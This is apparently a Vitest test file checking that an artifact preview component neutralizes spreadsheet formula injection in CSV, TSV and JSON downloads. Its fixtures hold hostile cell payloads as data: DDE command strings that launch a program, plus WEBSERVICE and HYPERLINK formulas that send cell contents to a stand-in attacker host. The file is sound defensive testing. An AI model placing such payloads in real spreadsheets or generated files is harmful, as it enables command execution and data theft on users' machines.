import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import { ArtifactPreview, type ArtifactData } from './ArtifactPreview';

interface CapturedDownload {
  filename: string;
  body: string;
  mime: string;
}

const captured: CapturedDownload[] = [];

function tabularArtifact(content: string, language?: string): ArtifactData {
  return { id: 'sheet-1', type: 'spreadsheet', title: 'Q3 report', content, language };
}

function openDownloadMenu(artifact: ArtifactData) {
  render(<ArtifactPreview artifact={artifact} />);
  const trigger = screen.getByLabelText('Download artifact');
  fireEvent.keyDown(trigger, { key: 'Enter' });
}

function clickAndCapture(itemName: string | RegExp): CapturedDownload {
  fireEvent.click(screen.getByRole('menuitem', { name: itemName }));
  const last = captured.at(-1);
  expect(last).toBeDefined();
  return last!;
}

function downloadCsv(content: string): CapturedDownload {
  openDownloadMenu(tabularArtifact(content));
  return clickAndCapture('Download as CSV');
}

function downloadSource(content: string, language: string): CapturedDownload {
  openDownloadMenu(tabularArtifact(content, language));
  return clickAndCapture(`Download source (.${language})`);
}

beforeEach(() => {
  captured.length = 0;
  const RealBlob = globalThis.Blob;
  let pending: { body: string; mime: string } | null = null;
  class RecordingBlob extends RealBlob {
    constructor(parts: BlobPart[] = [], options?: BlobPropertyBag) {
      super(parts, options);
      pending = { body: parts.map(String).join(''), mime: options?.type ?? '' };
    }
  }
  vi.stubGlobal('Blob', RecordingBlob);
  URL.createObjectURL = vi.fn(() => 'blob:artifact-preview-test');
  URL.revokeObjectURL = vi.fn();
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
    this: HTMLAnchorElement,
  ) {
    if (pending) captured.push({ filename: this.download, ...pending });
    pending = null;
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe('ArtifactPreview · Download as CSV', () => {
  const singleCellPayloads = [
    "=cmd|'/c calc'!A0",
    '=WEBSERVICE("http://attacker.example/x"&A1)',
    "@SUM(1+1)*cmd|'/c calc'!A0",
    '\t=1+1',
    ' =1+1',
  ];

  it.each(singleCellPayloads)('neutralizes tool-controlled content: %j', (payload) => {
    const file = downloadCsv(payload);
    expect(file.filename).toBe('Q3 report.csv');
    expect(file.body).not.toBe(payload);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
  });

  it('neutralizes a formula cell inside a table without rewriting the rest of the row', () => {
    const file = downloadCsv('name,link\nAcme,=HYPERLINK("http://attacker.example"&A2)');
    expect(file.body).toBe('name,link\nAcme,\'=HYPERLINK("http://attacker.example"&A2)');
  });

  it('leaves a benign table byte-identical', () => {
    expect(downloadCsv('name,score\nAlice,30\nBob,-7').body).toBe('name,score\nAlice,30\nBob,-7');
  });

  it.each(['name,,city\r\nA,B\r\n1,2,3,4\r\n\r\n', ' name ; score \nAlice;30\n'])(
    'downloads %j exactly as the model wrote it',
    (content) => {
      expect(downloadCsv(content).body).toBe(content);
    },
  );

  it('serializes a json array-of-objects artifact into the rows it renders', () => {
    const file = downloadCsv(
      JSON.stringify([
        { Name: 'Alice', Age: 30 },
        { Name: 'Bob', Age: 41 },
      ]),
    );
    expect(file.filename).toBe('Q3 report.csv');
    expect(file.mime).toBe('text/csv;charset=utf-8;');
    expect(file.body).toBe('Name,Age\nAlice,30\nBob,41');
  });

  it('neutralizes a formula carried in a json cell', () => {
    const file = downloadCsv(JSON.stringify([{ name: 'Acme', link: "=cmd|'/c calc'!A0" }]));
    expect(file.body).toBe("name,link\nAcme,'=cmd|'/c calc'!A0");
  });
});

describe('ArtifactPreview · Download source', () => {
  it('neutralizes a source download whose language names a spreadsheet file', () => {
    const payload = "=cmd|'/c calc'!A0";
    const file = downloadSource(payload, 'csv');
    expect(file.filename).toBe('Q3 report.csv');
    expect(file.body).not.toBe(payload);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
    expect(file.mime).toBe('text/csv;charset=utf-8;');
  });

  it('neutralizes a tab-separated source download', () => {
    const file = downloadSource('@SUM(1+1)*cmd', 'tsv');
    expect(file.filename).toBe('Q3 report.tsv');
    expect(file.body).toBe("'@SUM(1+1)*cmd");
    expect(file.mime).toBe('text/tab-separated-values;charset=utf-8;');
  });

  it('leaves a non-spreadsheet source download byte-identical', () => {
    const file = downloadSource('const total = -1 + 2;', 'ts');
    expect(file.filename).toBe('Q3 report.ts');
    expect(file.body).toBe('const total = -1 + 2;');
    expect(file.mime).toBe('text/plain');
  });
});
